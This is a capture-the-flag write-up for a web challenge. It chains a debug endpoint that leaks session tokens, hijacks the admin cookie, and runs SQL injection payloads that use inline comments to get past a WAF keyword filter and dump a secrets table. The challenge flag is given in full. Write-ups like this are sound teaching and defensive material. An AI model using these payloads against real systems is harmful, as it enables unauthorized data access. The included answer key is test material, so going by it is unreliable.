---
ctf: ScarletCTF 2026
category: web
difficulty: hard
points: 300
flag: RUSEC{S3ss10n_H1j4ck1ng_1s_Fun_2938}
techniques:
  - session-hijacking
  - sql-injection
  - waf-bypass
tools:
  - burp-suite
  - sqlmap
---

# Campus One

## Description

Access the admin panel and retrieve the hidden flag from the backend.

## Solution

### Step 1: Discover Debug Endpoint

Fuzzing the API reveals an exposed debug endpoint:

```bash
curl https://campus.ctf.rusec.club/api/debug/sessions
```

Response:
```json
{
  "active_sessions": [
    {"user": "admin", "token": "eyJhbGc..."}
  ]
}
```

### Step 2: Session Hijacking

Use the leaked admin session token to access the admin panel:

```bash
curl -H "Cookie: session=eyJhbGc..." https://campus.ctf.rusec.club/admin
```

This reveals an order search feature at `/api/admin/search?q=...`

### Step 3: SQL Injection with WAF Bypass

The search parameter is vulnerable to SQL injection, but a WAF blocks common keywords. Bypass using inline comments:

```sql
' UN/**/ION SEL/**/ECT 1,2,3--
```

### Step 4: Enumerate Database

Find table names via `sqlite_master`:

```sql
' UN/**/ION SEL/**/ECT name FROM sqlite_master WHERE type='table'--
```

Reveals a `secrets` table with columns `key` and `value`.

### Step 5: Extract Flag

```sql
' UN/**/ION SEL/**/ECT key,value FROM secrets--
```

Response includes:
```json
{"key": "flag", "value": "RUSEC{S3ss10n_H1j4ck1ng_1s_Fun_2938}"}
```

## Key Vulnerabilities

1. **Information Disclosure (CWE-200):** Debug endpoint exposed session tokens
2. **Session Hijacking (CWE-384):** No session binding to IP/user-agent
3. **SQL Injection (CWE-89):** Unsanitized input in search query
4. **Insufficient WAF:** Inline comments bypass keyword filtering

